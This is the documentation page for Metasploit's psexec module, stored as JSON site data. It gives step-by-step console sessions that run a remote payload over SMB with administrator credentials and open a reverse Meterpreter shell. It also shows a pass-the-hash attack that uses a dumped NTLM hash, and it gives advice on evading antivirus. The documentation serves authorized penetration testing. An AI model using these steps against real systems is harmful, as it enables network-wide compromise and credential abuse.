{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/smb/psexec","result":{"data":{"moduleMetadataJson":{"id":"4568ecf7-161f-5f63-9b49-6b9152523ad2","name":"Microsoft Windows Authenticated User Code Execution","fullname":"exploit/windows/smb/psexec","description":"This module uses a valid administrator username and password (or\n        password hash) to execute an arbitrary payload. This module is similar\n        to the \"psexec\" utility provided by SysInternals. This module is now able\n        to clean up after itself. The service created by this tool uses a randomly\n        chosen name and description.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/windows/smb/psexec","documentationSlug":"/modules/documentation/exploit/windows/smb/psexec","referencesSlug":"/modules/references/exploit/windows/smb/psexec"},"documentation":{"html":"<p>psexec is one of the most popular exploits against Microsoft Windows. It is a great way to test password security and demonstrate how a stolen password could lead to a complete compromise of an entire corporate network.</p>\n<p>The Metasploit Framework actually includes different module types of psexec for different scenarios. exploit/windows/smb/psexec is the father of them all and is used the same way\nyou normally would with any Metasploit exploits.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>To be able to use exploit/windows/smb/psexec:</p>\n<ol>\n<li>You must have a valid username/password.</li>\n<li>The firewall must allow SMB traffic.</li>\n<li>The target must use SMBv1.</li>\n<li>The remote Windows machine's network security policy must allow it. If you see <a href=\"https://github.com/rapid7/metasploit-framework/wiki/What-does-my-Rex%3A%3AProto%3A%3ASMB-Error-mean%3F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">one of these errors</a>, then the Windows machine does not allow it.</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>At the minimum, you should be able use psexec to get a session with a valid credential using the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/smb/psexec\nmsf exploit(psexec) &gt; set RHOST 192.168.1.80\nRHOST =&gt; 192.168.1.80\nmsf exploit(psexec) &gt; set SMBUser Administrator\nSMBUser =&gt; Administrator\nmsf exploit(psexec) &gt; set SMBPass goodpass\nSMBPass =&gt; goodpass\nmsf exploit(psexec) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.1.199:4444 \n[*] 192.168.1.80:445 - Connecting to the server...\n[*] 192.168.1.80:445 - Authenticating to 192.168.1.80:445 as user &#39;Administrator&#39;...\n[*] 192.168.1.80:445 - Selecting native target\n[*] 192.168.1.80:445 - Uploading payload...\n[*] 192.168.1.80:445 - Created \\PTIhqIrQ.exe...\n[+] 192.168.1.80:445 - Service started successfully...\n[*] 192.168.1.80:445 - Deleting \\PTIhqIrQ.exe...\n[*] Sending stage (957999 bytes) to 192.168.1.80\n[*] Meterpreter session 1 opened (192.168.1.199:4444 -&gt; 192.168.1.80:1042) at 2016-03-01 16:51:56 -0600\n\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>By default, using exploit/windows/smb/psexec can be as simple as setting the RHOST option, and you're ready to go. But in reality, you will probably need to at least configure:</p>\n<p><strong>The SMBUser Option</strong></p>\n<p>This is a valid Windows username.</p>\n<p><strong>The SMBPass option</strong></p>\n<p>This can be either the plain text version or the Windows hash.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p><strong>Pass the Hash</strong></p>\n<p>One common penetration testing scenario using psexec is that attackers usually begin by breaking into a box, dumping the hashes, and using some of those hashes to log into other boxes on the network using psexec. So in that scenario, with the following stolen hash:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; hashdump\nAdministrator:500:e39baff0f2c5fd4e93e28745b8bf4ba6:f4974ee4a935ee160a927eafbb3f317f:::</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>You can simply copy and paste it to the SMBPass option in psexec and get a session without needing to crack the hash:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/smb/psexec\nmsf exploit(psexec) &gt; set SMBUser Administrator\nSMBUser =&gt; Administrator\nmsf exploit(psexec) &gt; set SMBPass e39baff0f2c5fd4e93e28745b8bf4ba6:f4974ee4a935ee160a927eafbb3f317f\nSMBPass =&gt; e39baff0f2c5fd4e93e28745b8bf4ba6:f4974ee4a935ee160a927eafbb3f317f\nmsf exploit(psexec) &gt; set RHOST 192.168.1.80\nRHOST =&gt; 192.168.1.80\nmsf exploit(psexec) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.1.199:4444 \n[*] 192.168.1.80:445 - Connecting to the server...\n[*] 192.168.1.80:445 - Authenticating to 192.168.1.80:445 as user &#39;Administrator&#39;...\n[*] 192.168.1.80:445 - Selecting native target\n[*] 192.168.1.80:445 - Uploading payload...\n[*] 192.168.1.80:445 - Created \\QpxKDHyG.exe...\n[+] 192.168.1.80:445 - Service started successfully...\n[*] 192.168.1.80:445 - Deleting \\QpxKDHyG.exe...\n[*] Sending stage (957999 bytes) to 192.168.1.80\n[*] Meterpreter session 1 opened (192.168.1.199:4444 -&gt; 192.168.1.80:1043) at 2016-03-01 17:02:46 -0600\n\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Automatic Target</strong></p>\n<p>There are multiple targets available for exploit/windows/smb/psexec. The Automatic target is the default target. If the  Automatic target detects Powershell on the remote machine, it will try Powershell, otherwise it uses the natvie upload. Each target is explained below.</p>\n<p><strong>Powershell Target</strong></p>\n<p>The Powershell target forces the psexec module to run a Powershell command with a payload embedded in it. Since this approach does not leave anything on disk, it is a very powerful way to evade antivirus. However, older Windows machines might not support Powershell by default.</p>\n<p>Because of this, you will probably want to use the Automatic target setting. The automatic mode will check if the target supports Powershell before it tries it; the manually set Powershell target won't do that.</p>\n<p><strong>Native Upload Target</strong></p>\n<p>The Native target will attempt to upload the payload (executable) to SYSTEM32 (which can be modified with the\nSHARE datastore option), and then execute it with psexec.</p>\n<p>This approach is generally reliable, but has a high chance of getting caught by antivirus on the target. To counter this, you can try to use a template by setting the EXE::Path and EXE::Template datastore options. Or, you can supply your own custom EXE by setting the EXE::Custom option.</p>\n<p><strong>MOF Upload Target</strong></p>\n<p>The <a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">MOF</a> target technically does not use psexec; it does not explicitly tell Windows to execute anything. All it does is upload two files: the payload (exe) in SYSTEM32 and a managed object\nformat file in SYSTEM32\\wbem\\mof\\ directory. When Windows sees the MOF file in that directory, it automatically runs it. Once executed, the code inside the MOF file basically tells Windows to execute our payload in SYSTEM32, and you get a session.</p>\n<p>Although it's a neat trick, Metasploit's MOF library only works against Windows XP and Windows Server 2003. And since it writes files to disk, there is also a high chance of getting\ncaught by antivirus on the target.</p>\n<p>The best way to counter antivirus is still the same. You can either use a different template by setting the EXE::Path and EXE::Template datastore options or you can supply your own custom EXE by setting the EXE::Custom option.</p>"}}},"pageContext":{"id":"4568ecf7-161f-5f63-9b49-6b9152523ad2"}}}